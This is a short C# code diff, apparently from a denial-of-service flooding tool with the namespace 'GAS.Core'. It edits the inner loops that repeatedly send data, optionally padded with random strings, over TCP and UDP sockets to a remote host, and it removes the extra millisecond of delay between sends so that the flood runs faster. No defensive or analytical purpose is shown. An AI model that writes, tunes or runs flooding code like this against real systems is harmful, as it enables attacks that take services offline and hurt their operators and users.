@@ -55,7 +55,7 @@ namespace GAS.Core
                                     FloodCount++;
                                     if (AllowRandom) buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, Functions.RandomString()));
                                     socket.Send(buf);
-                                    if (Delay > 0) System.Threading.Thread.Sleep(Delay + 1);
+                                    if (Delay > 0) System.Threading.Thread.Sleep(Delay);
                                 }
                             }
                             catch { Failed++; }
@@ -69,7 +69,7 @@ namespace GAS.Core
 									FloodCount++;
                                     if (AllowRandom) buf=System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, Functions.RandomString()));
 									socket.SendTo(buf, SocketFlags.None, RHost);
-									if (Delay > 0) System.Threading.Thread.Sleep(Delay+1);
+									if (Delay > 0) System.Threading.Thread.Sleep(Delay);
 								}
 							}
 							catch {Failed++;}
